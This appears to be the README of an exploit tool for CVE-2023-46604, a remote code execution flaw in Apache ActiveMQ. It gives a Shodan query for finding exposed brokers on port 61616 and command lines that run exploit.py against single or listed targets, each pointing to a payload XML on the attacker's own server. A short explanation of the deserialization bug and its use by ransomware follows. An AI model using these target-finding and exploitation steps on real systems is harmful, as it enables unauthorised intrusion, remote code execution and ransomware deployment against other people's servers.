# CVE-2023-46604
Exploit for CVE-2023-46604
### This tool helps to exploit this vulnerability.
#### Shodan Query to find target:
```
product:"ActiveMQ" port:"61616"
```
#### Tools Usage:
```
for read targets from the file:
python3 exploit.py -f targets -c http://YourVPS/poc.xml
---
single target:
python3 exploit.py -ip IP -c http://YourVPS/poc.xml
```

## About this CVE:
CVE-2023-46604 is a critical remote code execution vulnerability in Apache ActiveMQ, an open-source message broker software. This vulnerability allows a remote attacker with network access to either a Java-based OpenWire broker or client to execute arbitrary shell commands. This is achieved by manipulating serialized class types in the OpenWire protocol, causing the broker to instantiate any class on the classpath. The vulnerability results from insecure deserialization within Apache ActiveMQ and has been exploited by attackers, including the HelloKitty ransomware family, to run ransomware binaries and fully compromise systems.
